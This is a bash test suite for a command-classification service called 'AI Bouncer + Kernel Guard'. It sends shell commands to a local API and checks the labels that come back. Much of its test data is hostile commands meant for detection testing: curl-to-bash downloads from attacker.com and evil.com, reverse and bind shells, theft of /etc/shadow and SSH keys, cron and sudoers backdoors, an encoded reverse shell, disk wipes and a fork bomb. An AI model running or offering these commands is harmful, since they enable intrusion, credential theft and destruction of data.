#!/bin/bash
# =============================================================================
# run_all_commands.sh  —  AI Bouncer + Kernel Guard
# =============================================================================
# One-stop command reference for all large_test_set test areas.
# Same style as scripts/test_attacks.sh — just run this file.
#
# Usage:
#   bash large_test_set/run_all_commands.sh
#
# Requirements:
#   - Backend running:  uvicorn backend.app:app --host 0.0.0.0 --port 8000
#   - curl + python3 in PATH
# =============================================================================

API_URL="${API_URL:-http://localhost:8000/analyze}"

# Colours
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

test_count=0
passed_count=0
failed_count=0

# ── helpers ──────────────────────────────────────────────────────────────────

section() {
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

run_test() {
    local cmd="$1"
    local expected="$2"
    local desc="$3"

    test_count=$((test_count + 1))

    local response
    response=$(curl -s --max-time 8 -X POST "$API_URL" \
        -H "Content-Type: application/json" \
        -d "{\"command\":\"$cmd\"}" 2>/dev/null || true)

    if [ -z "$response" ]; then
        echo -e "${RED}✗${NC} [$test_count] $desc"
        echo "     → No response. Is the backend running at $API_URL ?"
        failed_count=$((failed_count + 1))
        return
    fi

    local actual
    actual=$(echo "$response" | \
        python3 -c "import sys,json; print(json.load(sys.stdin).get('classification','ERROR'))" \
        2>/dev/null || echo "PARSE_ERROR")

    if [ "$actual" = "$expected" ]; then
        echo -e "${GREEN}✓${NC} [$test_count] $desc"
        passed_count=$((passed_count + 1))
    else
        local score
        score=$(echo "$response" | \
            python3 -c "import sys,json; print(round(json.load(sys.stdin).get('risk_score',0),1))" \
            2>/dev/null || echo "?")
        local rules
        rules=$(echo "$response" | \
            python3 -c "import sys,json; print(json.load(sys.stdin).get('matched_rules',[]))" \
            2>/dev/null || echo "?")
        echo -e "${RED}✗${NC} [$test_count] $desc"
        echo -e "     cmd:      ${YELLOW}$cmd${NC}"
        echo -e "     expected: ${GREEN}$expected${NC}   got: ${RED}$actual${NC}   score=$score   rules=$rules"
        failed_count=$((failed_count + 1))
    fi
}

# ── check backend ─────────────────────────────────────────────────────────────

echo ""
echo -e "${CYAN}🔍 AI Bouncer + Kernel Guard — Full Command Test Suite${NC}"
echo -e "${CYAN}   API: $API_URL${NC}"
echo ""

if ! curl -s --max-time 4 "${API_URL%/analyze}/" > /dev/null 2>&1; then
    echo -e "${RED}❌  Cannot reach backend at ${API_URL%/analyze}/${NC}"
    echo "    Start with:  uvicorn backend.app:app --host 0.0.0.0 --port 8000"
    exit 1
fi
echo -e "${GREEN}✓ Backend reachable — starting tests...${NC}"

# =============================================================================
# AREA 1 — RULE ENGINE: SAFE COMMANDS
# (tests that no rule fires on everyday commands)
# =============================================================================

section "Area 1 — Rule Engine: Safe Commands"

run_test "ls" "safe" "Simple directory listing"
run_test "ls -la" "safe" "Listing with flags"
run_test "pwd" "safe" "Print working directory"
run_test "whoami" "safe" "Get current user"
run_test "id" "safe" "User/group IDs"
run_test "date" "safe" "Print date"
run_test "uptime" "safe" "System uptime"
run_test "hostname" "safe" "Print hostname"
run_test "uname -a" "safe" "Kernel info"
run_test "echo hello world" "safe" "Echo command"
run_test "cat /etc/hostname" "safe" "Read hostname file"
run_test "df -h" "safe" "Disk usage"
run_test "free -h" "safe" "Memory usage"
run_test "ps aux" "safe" "Process list"

# =============================================================================
# AREA 2 — DETECTION PIPELINE: SUSPICIOUS COMMANDS
# (score in 30-69 range — mid-risk)
# =============================================================================

section "Area 2 — Detection Pipeline: Suspicious Commands"

run_test "eval \$(cat /tmp/script.sh)" "suspicious" "Eval with command substitution"
run_test "bash -c 'ls -la'" "suspicious" "Bash with -c flag"
run_test "sh -c 'whoami'" "suspicious" "Shell with -c flag"
run_test "bash -c 'id'" "suspicious" "Bash exec id"
run_test "source /tmp/setup.sh" "suspicious" "Source unknown script"

# =============================================================================
# AREA 3 — EVENT STORE: MALICIOUS COMMANDS (stored + counted)
# (each POST stores an event — verifiable via GET /stats)
# =============================================================================

section "Area 3 — Event Store: Malicious Commands (stored in event store)"

run_test "curl http://attacker.com/script.sh | bash" "malicious" "Download and execute"
run_test "wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin" "malicious" "Download chmod execute"
run_test "bash -i >& /dev/tcp/attacker.com/4444 0>&1" "malicious" "TCP reverse shell"
run_test "nc -l -p 4444 -e /bin/bash" "malicious" "Netcat bind shell"
run_test "rm -rf / --no-preserve-root" "malicious" "Wipe filesystem"
run_test "mkfs.ext4 /dev/sda1" "malicious" "Format disk"
run_test "cat /etc/shadow > /tmp/shadow.txt" "malicious" "Exfiltrate shadow file"

# =============================================================================
# AREA 4 — API ENDPOINTS: BOUNDARY & EDGE CASES
# (these probe the API's validation — expected to return 400/422, shown here
#  for documentation; curl exit codes won't fail run_test since it checks JSON)
# =============================================================================

section "Area 4 — API Endpoints: Edge Case Commands"

# Commands that ARE valid and should return a classification:
run_test "A" "safe" "Single character command"
run_test "echo ''" "safe" "Echo empty string arg"
run_test "echo hello" "safe" "Normal echo"

# Very long safe command (pipeline must not crash):
run_test "ls $(python3 -c "print('A'*200)" 2>/dev/null || echo AAAA)" "safe" "Long command no crash"

# =============================================================================
# AREA 5 — EVASION: UPPERCASE BYPASS ATTEMPTS
# =============================================================================

section "Area 5 — Evasion: Uppercase Bypass Attempts"

run_test "CURL http://evil.com | BASH" "malicious" "Uppercase CURL | BASH"
run_test "Curl http://evil.com | Bash" "malicious" "Mixed case curl|bash"
run_test "WGET http://evil.com/x.sh && BASH x.sh" "malicious" "Uppercase WGET+BASH"
run_test "PYTHON3 -c \"import os; os.system('id')\"" "malicious" "Uppercase PYTHON3 exec"
run_test "PERL -e 'exec \"/bin/bash\";'" "malicious" "Uppercase PERL exec"
run_test "RUBY -e \"exec '/bin/bash'\"" "malicious" "Uppercase RUBY exec"
run_test "PHP -r 'system(\"/bin/bash\");'" "malicious" "Uppercase PHP exec"

# =============================================================================
# AREA 5 — EVASION: WHITESPACE PADDING
# =============================================================================

section "Area 5 — Evasion: Whitespace Padding"

run_test "curl  http://evil.com  |  bash" "malicious" "Extra spaces around pipe"
run_test "wget  http://evil.com/x  &&  chmod +x x  &&  ./x" "malicious" "Extra spaces in chain"

# =============================================================================
# AREA 5 — EVASION: FALSE POSITIVE BASELINE
# (all of these must NOT be flagged malicious)
# =============================================================================

section "Area 5 — Evasion: False Positive Baseline (must be safe)"

run_test "git clone https://github.com/user/repo.git" "safe" "FP: git clone"
run_test "git pull" "safe" "FP: git pull"
run_test "git status" "safe" "FP: git status"
run_test "npm install" "safe" "FP: npm install"
run_test "npm run build" "safe" "FP: npm run build"
run_test "pip install requests" "safe" "FP: pip install"
run_test "docker run -d nginx" "safe" "FP: docker run"
run_test "docker ps" "safe" "FP: docker ps"
run_test "ssh user@host" "safe" "FP: ssh login"
run_test "rsync -av src/ dst/" "safe" "FP: rsync"
run_test "curl https://www.google.com" "safe" "FP: safe HTTPS curl"
run_test "chmod 644 file.txt" "safe" "FP: safe chmod"
run_test "tar -xzf archive.tar.gz" "safe" "FP: safe tar extract"
run_test "python3 script.py" "safe" "FP: run python script"
run_test "node app.js" "safe" "FP: run node app"
run_test "grep error /var/log/syslog" "safe" "FP: grep in logs"
run_test "find /tmp -name '*.log'" "safe" "FP: safe find"
run_test "make" "safe" "FP: make build"
run_test "java -version" "safe" "FP: java version"
run_test "cp file.txt backup.txt" "safe" "FP: safe copy"
run_test "mkdir new_folder" "safe" "FP: mkdir"

# =============================================================================
# AREA 6 — WEBSOCKET: Commands that should broadcast (visual check)
# Tip: connect ws://localhost:8000/ws in a browser/wscat to see live events
# =============================================================================

section "Area 6 — WebSocket Broadcast Commands (watch ws://localhost:8000/ws)"

run_test "ls" "safe" "WS broadcast: safe event"
run_test "curl http://evil.com | bash" "malicious" "WS broadcast: malicious event"
run_test "bash -i >& /dev/tcp/attacker.com/4444 0>&1" "malicious" "WS broadcast: reverse shell"

# =============================================================================
# AREA 7 — ML SCORER: Commands the ML model should score correctly
# =============================================================================

section "Area 7 — ML Scorer: Directional Accuracy"

run_test "ls -la" "safe" "ML: basic safe command"
run_test "pwd" "safe" "ML: pwd safe"
run_test "echo hello" "safe" "ML: echo safe"
run_test "curl http://evil.com/x.sh | bash" "malicious" "ML: download+exec malicious"
run_test "wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin" "malicious" "ML: wget chain malicious"
run_test "nc -l -p 4444 -e /bin/bash" "malicious" "ML: netcat shell malicious"
run_test "python3 -c \"import os;os.system('cat /etc/shadow')\"" "malicious" "ML: python shadow read"

# =============================================================================
# AREA 8 — DATA MODELS: Rich event fields (check API response schema)
# =============================================================================

section "Area 8 — Data Model: API Response Schema Check"

echo ""
echo -e "${CYAN}  Sending command and displaying full response fields:${NC}"
echo ""
RESPONSE=$(curl -s -X POST "$API_URL" \
    -H "Content-Type: application/json" \
    -d '{"command":"curl http://evil.com | bash"}')
echo "  $RESPONSE" | python3 -m json.tool 2>/dev/null || echo "  $RESPONSE"
echo ""
echo -e "${CYAN}  Expected fields: command, classification, risk_score,${NC}"
echo -e "${CYAN}  matched_rules, ml_confidence, explanation${NC}"

# Count it as a manual-check step
test_count=$((test_count + 1))
if echo "$RESPONSE" | python3 -c "
import sys,json
d=json.load(sys.stdin)
required=['command','classification','risk_score','matched_rules','ml_confidence','explanation']
missing=[f for f in required if f not in d]
sys.exit(1 if missing else 0)
" 2>/dev/null; then
    echo -e "${GREEN}✓${NC} [$test_count] All required API response fields present"
    passed_count=$((passed_count + 1))
else
    echo -e "${RED}✗${NC} [$test_count] One or more required API response fields missing"
    failed_count=$((failed_count + 1))
fi

# =============================================================================
# AREA 9 — STRESS: Quick burst of 10 rapid-fire requests
# =============================================================================

section "Area 9 — Stress: Rapid-Fire Burst (10 concurrent requests)"

echo ""
echo -e "${CYAN}  Sending 10 rapid POSTs to /analyze...${NC}"
STRESS_PASS=0
STRESS_FAIL=0
for i in $(seq 1 10); do
    R=$(curl -s --max-time 5 -X POST "$API_URL" \
        -H "Content-Type: application/json" \
        -d '{"command":"ls"}' 2>/dev/null || true)
    CLS=$(echo "$R" | python3 -c "import sys,json; print(json.load(sys.stdin).get('classification','ERR'))" 2>/dev/null || echo "ERR")
    if [ "$CLS" = "safe" ]; then
        STRESS_PASS=$((STRESS_PASS + 1))
    else
        STRESS_FAIL=$((STRESS_FAIL + 1))
    fi
done

test_count=$((test_count + 1))
if [ "$STRESS_FAIL" -eq 0 ]; then
    echo -e "${GREEN}✓${NC} [$test_count] All 10 rapid-fire requests returned 'safe' correctly"
    passed_count=$((passed_count + 1))
else
    echo -e "${RED}✗${NC} [$test_count] $STRESS_FAIL/10 rapid-fire requests failed"
    failed_count=$((failed_count + 1))
fi

# Check stats endpoint consistency after burst
STATS=$(curl -s "${API_URL%/analyze}/stats")
TOTAL_EVT=$(echo "$STATS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['safe']+d['suspicious']+d['malicious'])" 2>/dev/null || echo "-1")
STORED=$(echo "$STATS" | python3 -c "import sys,json; print(json.load(sys.stdin)['total_events'])" 2>/dev/null || echo "-2")

test_count=$((test_count + 1))
if [ "$TOTAL_EVT" = "$STORED" ]; then
    echo -e "${GREEN}✓${NC} [$test_count] Stats endpoint totals consistent (safe+suspicious+malicious=$STORED)"
    passed_count=$((passed_count + 1))
else
    echo -e "${RED}✗${NC} [$test_count] Stats inconsistent: counted=$TOTAL_EVT stored=$STORED"
    failed_count=$((failed_count + 1))
fi

# =============================================================================
# AREA 10 — EXTENDED ATTACK PATTERNS
# =============================================================================

section "Area 10 — Extended Attacks: Persistence Mechanisms"

run_test "echo '* * * * * /tmp/backdoor.sh' | crontab" "malicious" "Crontab injection"
run_test "(crontab -l; echo '* * * * * /tmp/malware.sh') | crontab -" "malicious" "Append to crontab"
run_test "echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" "malicious" "Sudoers backdoor"
run_test "insmod /tmp/rootkit.ko" "malicious" "Kernel rootkit insertion"
run_test "modprobe rootkit" "malicious" "Rootkit via modprobe"
run_test "echo 'insmod /tmp/rootkit.ko' >> /etc/rc.local" "malicious" "Persist via rc.local"

section "Area 10 — Extended Attacks: Compound Chained Commands"

run_test "ls; cat /etc/shadow > /tmp/leak" "malicious" "Semicolon: ls + exfil"
run_test "whoami && curl http://evil.com | bash" "malicious" "AND chain: whoami + exec"
run_test "id; rm -rf /" "malicious" "Semicolon: id + destroy"
run_test "echo hi; nc -l -p 4444 -e /bin/bash" "malicious" "Semicolon: echo + bind shell"
run_test "while true; do curl http://attacker.com/cmd | bash; sleep 3600; done" "malicious" "Polling loop"

section "Area 10 — Extended Attacks: Data Exfiltration Variants"

run_test "tar czf /tmp/backup.tar.gz /etc/shadow /root/.ssh" "malicious" "Tar sensitive files"
run_test "zip -r backup.zip /root/.ssh /etc/shadow" "malicious" "Zip sensitive files"
run_test "find /root -type f -name '*.key' -exec cat {} \;" "malicious" "Find and cat private keys"
run_test "grep -r 'password' /home/" "malicious" "Grep passwords in home"
run_test "grep -r 'api_key' /" "malicious" "Grep API keys system-wide"
run_test "cp /root/.ssh/id_rsa /tmp/stolen_key" "malicious" "Copy SSH private key"
run_test "cp /root/.bash_history /tmp/history_dump" "malicious" "Copy bash history"
run_test "strings /usr/local/bin/app | grep password" "malicious" "Strings binary for passwords"

section "Area 10 — Extended Attacks: Encoded / Obfuscated Payloads"

run_test "base64 -d <<< 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ=='" "malicious" "Base64 decode reverse shell"
run_test "echo 'L2Jpbi9iYXNo' | base64 -d" "malicious" "Echo pipe base64 decode"
run_test "xxd -r -p <<< '2f62696e2f62617368'" "malicious" "Hex decode via xxd"
run_test "printf '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'" "malicious" "Printf hex escape"
run_test "echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | bash" "malicious" "Echo hex pipe bash"

section "Area 10 — Extended Attacks: Living-Off-The-Land (LOLBins)"

run_test "perl -e 'exec \"/bin/bash\";'" "malicious" "Perl exec shell"
run_test "ruby -e \"exec '/bin/bash'\"" "malicious" "Ruby exec shell"
run_test "php -r 'system(\"/bin/bash\");'" "malicious" "PHP exec shell"
run_test "tclsh -c 'exec /bin/bash'" "malicious" "Tclsh exec shell"
run_test "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config" "malicious" "Sed enable SSH root"
run_test "strace -e trace=open /usr/local/bin/app" "malicious" "Strace secret extraction"

section "Area 10 — Extended Attacks: Privilege Escalation"

run_test "sudo -u root /bin/bash -i" "malicious" "Sudo root shell"
run_test "su -" "malicious" "Su to root"
run_test "su root" "malicious" "Su root directly"
run_test "chmod 777 /etc/shadow" "malicious" "Chmod shadow world-writable"
run_test "chmod 777 /etc/passwd" "malicious" "Chmod passwd world-writable"
run_test "echo 'root:\$1\$salt\$hashed:0:0:root:/root:/bin/bash' >> /etc/passwd" "malicious" "Add backdoor root user"

section "Area 10 — Extended Attacks: Network Backdoors"

run_test "socat exec:'/bin/bash' TCP-LISTEN:4444" "malicious" "Socat bind shell"
run_test "ncat -l -p 4444 -e /bin/bash" "malicious" "Ncat bind shell"
run_test "mknod /tmp/backpipe p && /bin/bash 0</tmp/backpipe | nc attacker.com 4444 1>/tmp/backpipe" "malicious" "Named pipe reverse shell"
run_test "mkfifo /tmp/fifo; bash -i < /tmp/fifo 2>&1 | nc attacker.com 4444 > /tmp/fifo" "malicious" "FIFO reverse shell"
run_test "iptables -A INPUT -j DROP" "malicious" "Iptables lockout"

section "Area 10 — Extended Attacks: Destructive Commands"

run_test "rm -rf /" "malicious" "Wipe root filesystem"
run_test "dd if=/dev/zero of=/dev/sda" "malicious" "Zero out disk"
run_test "dd if=/dev/random of=/dev/sdb" "malicious" "Random wipe disk"
run_test "mkfs.vfat /dev/sdb" "malicious" "Format disk as FAT"
run_test ":(){ :|:& };:" "malicious" "Bash fork bomb"

# =============================================================================
# SUMMARY
# =============================================================================

echo ""
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BLUE}  FINAL RESULTS${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  Total tests :  $test_count"
echo -e "  ${GREEN}Passed      :  $passed_count${NC}"
echo -e "  ${RED}Failed      :  $failed_count${NC}"
echo ""

if [ "$failed_count" -eq 0 ]; then
    echo -e "${GREEN}✅  All $test_count tests passed!${NC}"
    echo ""
    echo "  Next steps:"
    echo "  - Open http://localhost:5173 to view the live dashboard"
    echo "  - Connect ws://localhost:8000/ws to watch real-time events"
    echo "  - Run Python unit tests:  pytest large_test_set/ -v"
    exit 0
else
    PCT=$(( (passed_count * 100) / test_count ))
    echo -e "${RED}❌  $failed_count/$test_count tests failed  (${PCT}% pass rate)${NC}"
    echo ""
    echo "  Troubleshooting:"
    echo "  - Is the backend running?  uvicorn backend.app:app --port 8000"
    echo "  - Is the ML model trained? python backend/models/train_model.py"
    echo "  - Check logs in the backend terminal for errors"
    exit 1
fi
